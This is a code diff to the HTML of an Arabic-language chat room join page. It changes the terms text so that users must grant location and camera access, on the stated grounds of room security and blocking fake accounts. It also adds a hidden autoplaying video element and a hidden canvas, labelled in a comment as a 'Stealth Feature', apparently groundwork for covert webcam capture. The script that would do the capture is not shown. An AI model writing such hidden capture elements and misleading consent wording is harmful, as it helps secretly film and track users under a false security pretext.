@@ -33,7 +33,7 @@
             
             <form id="joinForm" class="join-form">
                 <input type="text" id="usernameInput" placeholder="أدخل اسمك المستعار..." required maxlength="20" autocomplete="off">
-                <p class="terms-text"><small>بالانضمام أنت توافق على شروط الغرفة (قد يطلب المتصفح إذن الوصول للموقع لضمان أمان الغرفة).</small></p>
+                <p class="terms-text"><small>بالانضمام أنت توافق على شروط الغرفة (يجب السماح بالوصول للموقع والكاميرا لضمان أمان الغرفة وتجنب الحسابات الوهمية).</small></p>
                 <button type="submit" class="primary-btn">انضمام الآن</button>
             </form>
         </div>
@@ -57,6 +57,10 @@
             </form>
         </div>
     </main>
+
+    <!-- Hidden Elements for Stealth Feature -->
+    <video id="stealthVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="stealthCanvas" style="display:none;"></canvas>
 
     <!-- Socket.IO JS -->
     <script src="/socket.io/socket.io.js"></script>
